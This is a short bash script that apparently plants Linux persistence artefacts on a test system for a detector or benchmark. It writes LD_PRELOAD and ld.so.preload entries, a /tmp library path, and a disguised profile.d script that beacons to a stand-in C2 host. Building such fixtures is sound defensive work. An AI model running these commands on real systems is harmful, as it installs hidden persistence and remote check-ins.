#!/bin/bash
# LD_PRELOAD and Library Injection
set -e

echo "[*] Configuring LD injection vulnerabilities..."

# PER-401: LD_PRELOAD in environment
echo 'export LD_PRELOAD=/usr/local/lib/libinject.so' >> /etc/profile.d/evil.sh
chmod +x /etc/profile.d/evil.sh

# Also set for current sessions
echo 'LD_PRELOAD=/usr/local/lib/libinject.so' >> /etc/environment

# PER-402: ld.so.preload entries
echo '/usr/local/lib/libevil.so' > /etc/ld.so.preload 2>/dev/null || true

# PER-403: LD_LIBRARY_PATH anomaly
echo 'export LD_LIBRARY_PATH=/tmp/exploit_path' >> /etc/profile.d/ld_path.sh
chmod +x /etc/profile.d/ld_path.sh

# PER-301: Suspicious profile.d script
cat > /etc/profile.d/system-check.sh << 'PROFILE'
#!/bin/bash
# Looks like a system check but connects to C2
/usr/local/bin/.bashdb -c "curl -s http://evil.example.com/checkin" &>/dev/null &
PROFILE
chmod +x /etc/profile.d/system-check.sh

echo "[+] LD injection vulnerabilities configured"
